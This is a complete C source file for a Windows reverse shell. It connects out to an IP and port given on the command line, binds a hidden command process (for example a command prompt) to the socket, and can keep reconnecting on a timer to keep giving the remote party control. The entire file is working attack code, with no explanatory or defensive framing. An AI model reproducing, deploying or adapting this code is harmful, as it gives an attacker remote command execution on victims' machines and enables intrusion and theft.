#include <io.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <winsock2.h>
#include <windows.h>
#include <process.h>
#include <sys/types.h>

int main (int argc, char *argv[]){
      
    if (argc < 4){
        printf ("Usage: %s IP PORT CMD [retry interval (s)]\n", argv[0]);
	printf ("If the retry interval is not specified the shell will be executed only once\n", argv[0]);
        return 1;
    }
      
    char *ip = argv[1];
    unsigned short port = atoi (argv[2]);
    char *cmd = argv[3];
    unsigned short callback = 5000;
	bool defaultCallback = 1;
      
     
    if (argc == 5){
        callback = atoi (argv[4])*1000;
        defaultCallback = 0;
    }
      
    WSADATA wsaData;
    if (WSAStartup (MAKEWORD (2, 2), &wsaData) != 0){
        printf ("WSASturtup failed.\n");
        return 1;
    }
      
    struct sockaddr_in sa;
    SOCKET sc = WSASocketA (AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    sa.sin_family = AF_INET;
    sa.sin_port = htons (port);
    sa.sin_addr.s_addr = inet_addr (ip);
      
    DWORD dwExitCode;
      
    while (1 == 1){
        
        sc = WSASocketA (AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
        while (connect (sc, (struct sockaddr *) &sa, sizeof (sa)) != 0){
            printf ("Connecting...\n");
            Sleep (callback);
        }
              
        printf ("Connected!\n");
              
        STARTUPINFO si;
        memset (&si, 0, sizeof (si));
        si.cb = sizeof (si);
        si.dwFlags = (STARTF_USESTDHANDLES);
        si.hStdInput = (HANDLE) sc;
        si.hStdOutput = (HANDLE) sc;
        si.hStdError = (HANDLE) sc;
        PROCESS_INFORMATION pi;
              
        CreateProcessA (NULL, cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
            
        printf ("Shell subprocess spawned!\n");
              
        if (defaultCallback){
            return 0;
        }
              
        while (1){
            Sleep (callback);
            if (GetExitCodeProcess (pi.hProcess, &dwExitCode)){
                if (dwExitCode != STILL_ACTIVE){
                printf ("Process terminated retrying connection\n");
                break;
                }
            }
            else
                printf ("Failed to retrieve shell status\n");
        }
        close (sc);
        CloseHandle (pi.hProcess);
    }
    return 0;
}
